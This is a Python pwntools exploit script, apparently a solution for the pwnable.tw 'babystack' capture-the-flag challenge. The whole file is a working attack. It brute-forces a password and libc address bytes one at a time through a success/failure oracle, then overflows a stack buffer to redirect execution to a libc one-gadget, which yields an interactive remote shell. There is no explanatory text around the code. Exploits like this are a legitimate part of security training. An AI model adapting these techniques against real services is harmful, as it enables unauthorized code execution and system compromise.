from pwn import *

BEDUG = False

libc = ELF('./libc.so.6')

byte = ''

if BEDUG == True:
	io = process('./babystack_patched', env = {"LD_PRELOAD":"./libc.so.6"})
else:
	io = remote('chall.pwnable.tw', 10205)

def brutebyte():
	print('Bruteforcing bytepass...')
	bytepass = b''
	for i in range(0x10):
		for byte in range(1, 256):
			io.sendlineafter(b'>> ', b'1')
			print(b'Bruting [%d]:[%s]' % (i+1, p8(byte)))
			io.recvuntil(b'Your passowrd :')
			if p8(byte) != b'\n':
				io.sendline(bytepass+p8(byte))
			else:
				io.sendline(bytepass+p8(byte-1))
			if b'Success' in io.recvline():
				bytepass += p8(byte)
				break
		io.sendlineafter(b'>> ', b'1')
	print(b'Done! bytepass is %s' % (bytepass))
	return bytepass

def leak(passwd):
	print('Bruteforcing libc...')
	io.sendlineafter(b'>> ', b'1')
	io.recvuntil(b'Your passowrd :')
	io.send(b'A'*64+b'B'*24)
	io.sendlineafter(b'>> ', b'1')
	io.recvuntil(b'Your passowrd :')
	io.sendline(passwd)
	io.sendlineafter(b'>> ', b'3')
	io.recvuntil(b'Copy :')
	io.send(b'AAAAA')
	io.recvuntil(b'>> ')
	io.send(b'1')
	#sneaky boi login then logout

	pad = b'B'*16+b'1'+b'B'*7
	libcbuf = b''
	for i in range(6):
		for byte in range(1, 256):
			io.recvuntil(b'>> ')
			io.send(b'1')
			io.recvuntil(b'Your passowrd :')
			#print(pad+p8(byte))
			print(b'Bruting [%d]:[%s]' % (i+1, p8(byte)))
			if p8(byte) != b'\n':
				io.sendline(pad+p8(byte))
			else:
				io.sendline(pad+p8(byte-1))
			if b'Success' in io.recvline():
				libcbuf+=p8(byte)
				pad+=p8(byte)
				break
		io.recvuntil(b'>> ')
		io.send(b'1')

	return u64(libcbuf+b'\0\0') - 0x6ffb4

bstr = brutebyte()
byte = p8(bstr[0])
libc.address = leak(byte)
log.info('Libc: '+hex(libc.address))
io.sendlineafter(b'>> ', b'1')
io.recvuntil(b'Your passowrd :')
io.send(b'A'*64+bstr+b'A'*24 + p64(libc.address + 0xf0567))
io.sendlineafter(b'>> ', b'1')
io.recvuntil(b'Your passowrd :')
io.sendline(b'B')
io.sendlineafter(b'>> ', b'3')
io.recvuntil(b'Copy :')
io.send(b'AAAAA')
io.interactive()